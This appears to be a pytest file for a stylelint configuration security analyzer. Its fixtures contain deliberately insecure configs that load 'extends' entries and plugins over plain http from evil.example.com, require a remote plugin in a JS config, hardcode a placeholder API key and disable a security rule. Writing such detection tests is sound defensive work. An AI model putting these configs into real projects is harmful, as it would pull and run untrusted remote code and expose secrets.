"""Tests for StylelintAnalyzer."""

from pathlib import Path

from devai.stylelint_analyzer import StylelintAnalyzer, StylelintFinding


INSECURE_STYLELINTRC = """\
{
  "extends": ["http://evil.example.com/stylelint-config-evil"],
  "plugins": [
    "http://evil.example.com/stylelint-plugin-evil.js"
  ],
  "api_key": "sk-live-hardcoded-secret-token-12345",
  "rules": {
    "function-url-no-scheme-relative": null
  }
}
"""

INSECURE_JS_CONFIG = """\
// stylelint.config.js
module.exports = {
  plugins: [require("http://evil.example.com/plugin.js")],
  process_env: process.env.API_SECRET_TOKEN
};
"""

HARDENED_STYLELINTRC = """\
{
  "extends": ["stylelint-config-standard"],
  "rules": {
    "function-url-no-scheme-relative": true
  }
}
"""


class TestStylelintAnalyzer:
    def test_detects_insecure_stylelintrc(self, tmp_path: Path):
        (tmp_path / ".stylelintrc.json").write_text(INSECURE_STYLELINTRC, encoding="utf-8")
        analyzer = StylelintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "insecure_http" in kinds
        assert "hardcoded_secret" in kinds
        assert analyzer.stats.high_severity >= 1

    def test_detects_disabled_security_rule(self, tmp_path: Path):
        (tmp_path / ".stylelintrc.json").write_text(INSECURE_STYLELINTRC, encoding="utf-8")
        analyzer = StylelintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "disabled_security_rule" in kinds

    def test_detects_insecure_js_config(self, tmp_path: Path):
        (tmp_path / "stylelint.config.js").write_text(INSECURE_JS_CONFIG, encoding="utf-8")
        analyzer = StylelintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "insecure_http" in kinds or "insecure_plugin" in kinds
        assert "secret_env_reference" in kinds

    def test_detects_package_json_stylelint_config(self, tmp_path: Path):
        pkg = """\
{
  "name": "demo",
  "stylelint": {
    "extends": ["http://insecure.example.com/config.js"]
  }
}
"""
        (tmp_path / "package.json").write_text(pkg, encoding="utf-8")
        analyzer = StylelintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "insecure_http" in kinds

    def test_hardened_config_passes(self, tmp_path: Path):
        (tmp_path / ".stylelintrc.json").write_text(HARDENED_STYLELINTRC, encoding="utf-8")
        analyzer = StylelintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = StylelintAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.summary() == "Stylelint: no config files found"

    def test_generate_hardened_template(self):
        config = StylelintAnalyzer(".").generate_hardened_template()
        assert "stylelint-config-standard" in config
        assert "function-url-no-scheme-relative" in config

    def test_to_context_includes_findings(self, tmp_path: Path):
        (tmp_path / ".stylelintrc.json").write_text(INSECURE_STYLELINTRC, encoding="utf-8")
        analyzer = StylelintAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Stylelint configuration analysis:" in context
        assert "insecure" in context.lower() or "hardcoded" in context.lower()

    def test_finding_format(self):
        finding = StylelintFinding(
            kind="test",
            severity="high",
            message="test message",
            path=".stylelintrc.json",
            lineno=1,
        )
        assert "[high]" in finding.format()
        assert ".stylelintrc.json:1" in finding.format()
